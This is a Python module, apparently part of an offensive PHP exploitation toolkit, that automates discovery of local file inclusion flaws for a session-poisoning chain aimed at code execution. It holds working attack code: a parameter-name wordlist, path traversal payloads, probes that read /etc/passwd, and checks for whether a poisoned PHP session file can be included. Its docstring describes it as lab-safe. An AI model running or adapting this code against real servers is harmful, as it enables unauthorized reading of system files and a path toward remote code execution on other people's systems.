"""Application-level LFI discovery for the session-poisoning chain.

Chain A needs two things the PHP core does not provide: a reachable local
file inclusion sink and the parameter name it reads. Public toolkits
(murrez/php2shell) automate this instead of guessing `?page=`. This module
does the same in a lab-safe way:

  - probe a small parameter wordlist with a known-readable file
    (`/etc/passwd` by default) and look for a stable marker;
  - optionally verify that the target's own session file
    (`<save_path>/sess_<sid>`) is includable, with direct and traversal
    spellings.

No crawling, no target lists: the caller supplies the candidate sink paths.
"""

from . import probe

DEFAULT_PARAMS = (
    "page", "file", "path", "include", "inc", "template", "view", "doc",
    "document", "lang", "language", "module", "load", "url", "src", "cat",
    "dir", "action", "pg", "p", "content", "filename", "name", "show",
    "display", "read", "download", "theme", "layout", "section",
)

TRAVERSALS = ("", "../../../../", "../../../../../", "....//....//")


def _url(path, param, value):
    sep = "&" if "?" in path else "?"
    return f"{path}{sep}{param}={value}"


def probe_include(host, port, path, param, value, marker, timeout=10,
                  recv_timeout=8):
    """GET `path?param=value`; return (ok, status, body_excerpt)."""
    try:
        resp = probe.http_get(
            host, port, _url(path, param, value),
            timeout=timeout, recv_timeout=recv_timeout,
        )
    except OSError as e:
        return False, f"error: {e}", b""
    body = probe.body(resp)
    return (marker.encode("latin-1") in body), probe.status(resp), body[:400]


def discover(host, port, path="/lfi.php", include="/etc/passwd",
             marker="root:x:0:0", params=None, traversals=TRAVERSALS):
    """Return a list of working (param, value, status) tuples."""
    hits = []
    seen = set()
    for param in (params or DEFAULT_PARAMS):
        if param in seen:
            continue
        seen.add(param)
        for prefix in traversals:
            value = f"{prefix}{include}"
            ok, status, _ = probe_include(host, port, path, param, value, marker)
            if ok:
                hits.append((param, value, status))
                break
    return hits


def session_candidates(sid, save_path="/tmp/sessions"):
    """Direct and traversal spellings of a PHP session file."""
    base = f"{save_path.rstrip('/')}/sess_{sid}"
    return (
        base,
        f"../../../../{base.lstrip('/')}",
        f"../../../../../{base.lstrip('/')}",
        f"....//....//....//{base.lstrip('/')}",
    )


def discover_session_include(host, port, sid, path="/lfi.php",
                             save_path="/tmp/sessions", marker=b"PHP2SHELL",
                             params=None):
    """Find a param that includes the session file carrying `marker`."""
    hits = []
    for param in (params or DEFAULT_PARAMS):
        for value in session_candidates(sid, save_path):
            try:
                resp = probe.http_get(
                    host, port, _url(path, param, value),
                    timeout=10, recv_timeout=8,
                )
            except OSError:
                continue
            if marker in probe.body(resp):
                hits.append((param, value, probe.status(resp)))
                break
    return hits
